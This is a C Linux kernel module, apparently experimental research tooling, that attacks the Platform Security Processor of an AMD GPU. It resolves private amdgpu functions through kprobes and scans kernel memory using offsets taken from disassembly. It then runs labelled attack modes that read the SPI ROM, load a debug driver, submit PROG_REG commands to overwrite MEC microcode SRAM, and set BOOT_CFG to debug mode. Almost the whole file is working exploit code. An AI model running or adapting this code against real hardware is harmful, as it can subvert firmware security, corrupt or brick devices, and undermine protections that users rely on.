/*
 * patch_mec_fw34.c — Phase 34v3: Direct PSP Function Calls
 *
 * Disassembly of psp_hw_init/psp_sw_init shows:
 *   - psp_context is at offset 0x3b910 within amdgpu_device
 *   - psp_sw_init stores to adev+0x3b940 (psp.cmd)
 *   - adev->psp.adev should equal adev at offset 0x3b910
 *
 * pci_get_drvdata() returns struct drm_device* (not amdgpu_device).
 * drm_device is embedded within amdgpu_device at some offset.
 * adev = container_of(drm_dev, struct amdgpu_device, ddev)
 *
 * Strategy: scan backwards from drm_dev to find where adev starts,
 * by checking if *(candidate + 0x3b910) == candidate.
 */
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/pci.h>
#include <linux/io.h>
#include <linux/delay.h>
#include <linux/kprobes.h>
#include <linux/dma-mapping.h>
#include <linux/slab.h>

MODULE_LICENSE("GPL");

#define AMD_VENDOR_ID 0x1002
#define AMD_DEV_ID    0x1586

static void __iomem *mmio;
static struct pci_dev *g_pdev;

static u32 rr(u32 dw_off) { return readl(mmio + (u64)dw_off * 4); }
static void wr(u32 dw_off, u32 val) {
	writel(val, mmio + (u64)dw_off * 4);
	readl(mmio + (u64)dw_off * 4);
}

#define regCP_MEC1_INSTR_PNTR      0x021A8
#define regCP_MEC_CNTL             0x0A802
#define regCP_MEC_ME1_UCODE_ADDR   0x0A814
#define regCP_MEC_ME1_UCODE_DATA   0x0A815

/* PSP offset within amdgpu_device — from disassembly */
#define PSP_OFFSET_IN_ADEV  0x3b910

static int attack_mode = 0;
module_param(attack_mode, int, 0444);
MODULE_PARM_DESC(attack_mode,
	"0=find_psp, 1=spi_read, 2=debug_drv, 3=prog_reg, 4=boot_cfg, 5=all");

typedef int (*fn_exec_spi_cmd)(void *psp, int cmd, u32 offset, u32 val);
typedef int (*fn_bootloader_load_dbg_drv)(void *psp);
typedef int (*fn_psp_cmd_submit)(void *psp, void *ucode, void *cmd, u64 fence);

static fn_exec_spi_cmd psp_exec_spi;
static fn_bootloader_load_dbg_drv psp_load_dbg;
static fn_psp_cmd_submit psp_submit;

static void *cmd_buf;
static dma_addr_t cmd_dma;
static void *fence_buf;
static dma_addr_t fence_dma;
#define CMD_BUF_SIZE  4096
#define FENCE_BUF_SIZE 4096

static unsigned long klookup(const char *name)
{
	struct kprobe kp = { .symbol_name = name };
	unsigned long addr;
	if (register_kprobe(&kp) < 0) return 0;
	addr = (unsigned long)kp.addr;
	unregister_kprobe(&kp);
	return addr;
}

/*
 * Find amdgpu_device from drm_device.
 *
 * drm_device is embedded in amdgpu_device at offset 'ddev_offset'.
 * So adev = drm_dev - ddev_offset.
 * We verify by checking adev->psp.adev == adev (at offset 0x3b910).
 *
 * Common ddev offsets in amdgpu: 0x28, 0x30, 0x38, 0x2968, etc.
 * We try all offsets in steps of 8 from 0 to 64KB.
 */
static void *find_adev(void *drm_dev)
{
	int ddev_off;
	u64 *psp_adev_ptr;
	void *candidate;

	pr_info("fw34: drm_device at %p\n", drm_dev);
	pr_info("fw34: Trying ddev offsets 0..65536 to find adev...\n");

	for (ddev_off = 0; ddev_off < 65536; ddev_off += 8) {
		candidate = (void *)((u8 *)drm_dev - ddev_off);

		/* Check if candidate + 0x3b910 contains candidate */
		psp_adev_ptr = (u64 *)((u8 *)candidate + PSP_OFFSET_IN_ADEV);

		if (*psp_adev_ptr == (u64)candidate) {
			pr_info("fw34: *** FOUND adev at %p (ddev_offset=%d/0x%X) ***\n",
				candidate, ddev_off, ddev_off);

			/* Verify by checking a few more psp_context fields */
			{
				u64 *psp = (u64 *)((u8 *)candidate + PSP_OFFSET_IN_ADEV);
				int i;
				pr_info("fw34: psp_context dump:\n");
				for (i = 0; i < 32; i++)
					pr_info("fw34:   psp[+0x%03X] = 0x%016llX\n",
						i * 8, psp[i]);
			}
			return candidate;
		}
	}

	pr_info("fw34: No adev found via psp.adev self-pointer\n");

	/* Fallback: try broader scan looking for recognizable psp patterns */
	pr_info("fw34: Trying broader scan with PSP signatures...\n");
	for (ddev_off = 0; ddev_off < 65536; ddev_off += 8) {
		candidate = (void *)((u8 *)drm_dev - ddev_off);
		psp_adev_ptr = (u64 *)((u8 *)candidate + PSP_OFFSET_IN_ADEV);

		/* Check if it's a valid kernel pointer */
		if ((*psp_adev_ptr & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL) {
			/* Check if psp_context has recognizable fields:
			 * psp[+0x30] should be cmd buffer (DMA pointer)
			 * psp[+0x08] should be psp_funcs vtable
			 */
			u64 maybe_funcs = *(u64 *)((u8 *)candidate + PSP_OFFSET_IN_ADEV + 8);
			u64 maybe_adev = *psp_adev_ptr;

			/* Check if maybe_adev is close to drm_dev (within 64KB) */
			if (maybe_adev >= (u64)drm_dev - 65536 &&
			    maybe_adev <= (u64)drm_dev + 65536) {
				/* And the second field should be a code pointer (module range) */
				if ((maybe_funcs & 0xFFFFFFFFC0000000ULL) == 0xFFFFFFFFC0000000ULL) {
					pr_info("fw34: Candidate adev at -%d: psp.adev=%llX psp.funcs=%llX\n",
						ddev_off, maybe_adev, maybe_funcs);
				}
			}
		}
	}

	return NULL;
}

static void attack_spi_read(void *psp)
{
	int ret;
	u32 offset;

	if (!psp_exec_spi) {
		pr_info("fw34: SPI function not found\n");
		return;
	}

	pr_info("fw34: === ATTACK A: SPI ROM READ ===\n");
	pr_info("fw34: Pre: C2PMSG_35=0x%08X C2PMSG_69=0x%08X\n",
		rr(0x16063), rr(0x16085));

	for (offset = 0; offset < 64; offset += 4) {
		ret = psp_exec_spi(psp, 0, offset, 0);
		pr_info("fw34: SPI[0x%04X] ret=%d\n", offset, ret);
		if (ret != 0) break;
		pr_info("fw34:   C2PMSG: [35]=0x%08X [36]=0x%08X [69]=0x%08X\n",
			rr(0x16063), rr(0x16064), rr(0x16085));
	}
}

static void attack_debug_driver(void *psp)
{
	int ret;

	if (!psp_load_dbg) {
		pr_info("fw34: Debug driver function not found\n");
		return;
	}

	pr_info("fw34: === ATTACK B: LOAD DEBUG DRIVER ===\n");
	pr_info("fw34: Pre: C2PMSG_35=0x%08X C2PMSG_91=0x%08X\n",
		rr(0x16063), rr(0x1609B));

	ret = psp_load_dbg(psp);
	pr_info("fw34: dbg_drv returned: %d\n", ret);

	pr_info("fw34: Post: C2PMSG_35=0x%08X C2PMSG_91=0x%08X\n",
		rr(0x16063), rr(0x1609B));

	/* Test SRAM */
	{
		u32 old_val, new_val;
		wr(regCP_MEC_ME1_UCODE_ADDR, 0);
		udelay(10);
		old_val = rr(regCP_MEC_ME1_UCODE_DATA);
		wr(regCP_MEC_ME1_UCODE_ADDR, 0);
		wr(regCP_MEC_ME1_UCODE_DATA, 0xBF800000);
		udelay(10);
		wr(regCP_MEC_ME1_UCODE_ADDR, 0);
		udelay(10);
		new_val = rr(regCP_MEC_ME1_UCODE_DATA);
		pr_info("fw34: SRAM[0]: old=0x%08X new=0x%08X %s\n",
			old_val, new_val,
			(new_val == 0xBF800000) ? "*** WRITE WORKS ***" :
			(new_val != old_val) ? "CHANGED" : "locked");
	}
}

static void attack_prog_reg(void *psp)
{
	u32 *cmd;
	int ret;

	if (!psp_submit || !cmd_buf) return;

	pr_info("fw34: === ATTACK C: PROG_REG ===\n");
	memset(cmd_buf, 0, CMD_BUF_SIZE);
	memset(fence_buf, 0, FENCE_BUF_SIZE);
	cmd = (u32 *)cmd_buf;

	cmd[2] = 11;  /* PROG_REG */
	cmd[7] = regCP_MEC_ME1_UCODE_ADDR * 4;
	cmd[8] = 0x0000;

	pr_info("fw34: PROG_REG: reg=0x%X val=0x%X\n", cmd[7], cmd[8]);
	ret = psp_submit(psp, NULL, cmd_buf, (u64)fence_dma);
	pr_info("fw34: ret=%d status=0x%X resp=0x%X\n", ret, cmd[0], cmd[3]);
	{
		int i;
		for (i = 0; i < 12; i += 4)
			pr_info("fw34:   [%02d] %08X %08X %08X %08X\n",
				i, cmd[i], cmd[i+1], cmd[i+2], cmd[i+3]);
	}

	if (ret == 0 && cmd[0] == 0) {
		pr_info("fw34: *** PROG_REG ACCEPTED ***\n");
		memset(cmd_buf, 0, CMD_BUF_SIZE);
		cmd[2] = 11;
		cmd[7] = regCP_MEC_ME1_UCODE_DATA * 4;
		cmd[8] = 0xBF800000;
		ret = psp_submit(psp, NULL, cmd_buf, (u64)fence_dma);
		pr_info("fw34: DATA write: ret=%d status=0x%X\n", ret, cmd[0]);
		wr(regCP_MEC_ME1_UCODE_ADDR, 0);
		udelay(10);
		pr_info("fw34: SRAM[0] = 0x%08X\n", rr(regCP_MEC_ME1_UCODE_DATA));
	}
}

static void attack_boot_cfg(void *psp)
{
	u32 *cmd;
	int ret;

	if (!psp_submit || !cmd_buf) return;

	pr_info("fw34: === ATTACK D: BOOT_CFG ===\n");
	memset(cmd_buf, 0, CMD_BUF_SIZE);
	memset(fence_buf, 0, FENCE_BUF_SIZE);
	cmd = (u32 *)cmd_buf;

	cmd[2] = 15;  /* BOOT_CFG */
	cmd[7] = 0;   /* query */

	ret = psp_submit(psp, NULL, cmd_buf, (u64)fence_dma);
	pr_info("fw34: Query: ret=%d status=0x%X resp=0x%X\n",
		ret, cmd[0], cmd[3]);
	{
		int i;
		for (i = 0; i < 16; i += 4)
			pr_info("fw34:   [%02d] %08X %08X %08X %08X\n",
				i, cmd[i], cmd[i+1], cmd[i+2], cmd[i+3]);
	}

	if (ret == 0) {
		pr_info("fw34: BOOT_CFG set debug...\n");
		memset(cmd_buf, 0, CMD_BUF_SIZE);
		cmd = (u32 *)cmd_buf;
		cmd[2] = 15;
		cmd[7] = 1;   /* set */
		cmd[8] = 0x1; /* debug */
		ret = psp_submit(psp, NULL, cmd_buf, (u64)fence_dma);
		pr_info("fw34: Set: ret=%d status=0x%X resp=0x%X\n",
			ret, cmd[0], cmd[3]);
		{
			int i;
			for (i = 0; i < 16; i += 4)
				pr_info("fw34:   [%02d] %08X %08X %08X %08X\n",
					i, cmd[i], cmd[i+1], cmd[i+2], cmd[i+3]);
		}
	}
}

static int __init fw34_init(void)
{
	unsigned long addr;
	void *drm_dev;
	void *adev;
	void *psp_ctx;

	g_pdev = pci_get_device(AMD_VENDOR_ID, AMD_DEV_ID, NULL);
	if (!g_pdev)
		return -ENODEV;

	mmio = pci_iomap(g_pdev, 5, 0);
	if (!mmio) {
		pci_dev_put(g_pdev);
		return -ENODEV;
	}

	pr_info("fw34: ====================================================\n");
	pr_info("fw34: PHASE 34v3: DIRECT PSP CALLS VIA DISASM OFFSETS\n");
	pr_info("fw34: Attack mode: %d\n", attack_mode);
	pr_info("fw34: PSP offset in adev: 0x%X\n", PSP_OFFSET_IN_ADEV);
	pr_info("fw34: ====================================================\n");

	drm_dev = pci_get_drvdata(g_pdev);
	if (!drm_dev) {
		pr_info("fw34: FAIL: no driver data\n");
		goto fail_mmio;
	}
	pr_info("fw34: drm_device = %p\n", drm_dev);

	pr_info("fw34: MEC: PC=0x%04X CNTL=0x%08X\n",
		rr(regCP_MEC1_INSTR_PNTR), rr(regCP_MEC_CNTL));

	/* Resolve functions */
	addr = klookup("psp_v13_0_exec_spi_cmd");
	psp_exec_spi = addr ? (fn_exec_spi_cmd)addr : NULL;
	pr_info("fw34: exec_spi_cmd = 0x%lX\n", addr);

	addr = klookup("psp_v13_0_4_bootloader_load_dbg_drv");
	psp_load_dbg = addr ? (fn_bootloader_load_dbg_drv)addr : NULL;
	pr_info("fw34: load_dbg_drv = 0x%lX\n", addr);

	addr = klookup("psp_cmd_submit_buf");
	psp_submit = addr ? (fn_psp_cmd_submit)addr : NULL;
	pr_info("fw34: cmd_submit_buf = 0x%lX\n", addr);

	/* Find adev from drm_dev */
	adev = find_adev(drm_dev);
	if (!adev) {
		pr_info("fw34: FAIL: could not find adev\n");
		goto fail_mmio;
	}

	psp_ctx = (void *)((u8 *)adev + PSP_OFFSET_IN_ADEV);
	pr_info("fw34: psp_context = %p\n", psp_ctx);

	/* Allocate DMA */
	cmd_buf = dma_alloc_coherent(&g_pdev->dev, CMD_BUF_SIZE,
				     &cmd_dma, GFP_KERNEL);
	fence_buf = dma_alloc_coherent(&g_pdev->dev, FENCE_BUF_SIZE,
				       &fence_dma, GFP_KERNEL);
	if (!cmd_buf || !fence_buf) {
		pr_info("fw34: FAIL: DMA alloc\n");
		goto fail_dma;
	}
	pr_info("fw34: CMD DMA: 0x%llX, Fence DMA: 0x%llX\n",
		(u64)cmd_dma, (u64)fence_dma);

	/* Execute */
	switch (attack_mode) {
	case 1: attack_spi_read(psp_ctx); break;
	case 2: attack_debug_driver(psp_ctx); break;
	case 3: attack_prog_reg(psp_ctx); break;
	case 4: attack_boot_cfg(psp_ctx); break;
	case 5:
		attack_boot_cfg(psp_ctx);
		attack_debug_driver(psp_ctx);
		attack_prog_reg(psp_ctx);
		attack_spi_read(psp_ctx);
		break;
	default:
		pr_info("fw34: Mode 0 — observe only\n");
		break;
	}

	pr_info("fw34: ====================================================\n");
	pr_info("fw34: Phase 34v3 complete.\n");
	pr_info("fw34: ====================================================\n");
	return 0;

fail_dma:
	if (cmd_buf)
		dma_free_coherent(&g_pdev->dev, CMD_BUF_SIZE, cmd_buf, cmd_dma);
	if (fence_buf)
		dma_free_coherent(&g_pdev->dev, FENCE_BUF_SIZE, fence_buf, fence_dma);
fail_mmio:
	pci_iounmap(g_pdev, mmio);
	pci_dev_put(g_pdev);
	return -ENODEV;
}

static void __exit fw34_exit(void)
{
	if (cmd_buf)
		dma_free_coherent(&g_pdev->dev, CMD_BUF_SIZE, cmd_buf, cmd_dma);
	if (fence_buf)
		dma_free_coherent(&g_pdev->dev, FENCE_BUF_SIZE, fence_buf, fence_dma);
	if (mmio)
		pci_iounmap(g_pdev, mmio);
	pci_dev_put(g_pdev);
	pr_info("fw34: Unloaded\n");
}

module_init(fw34_init);
module_exit(fw34_exit);
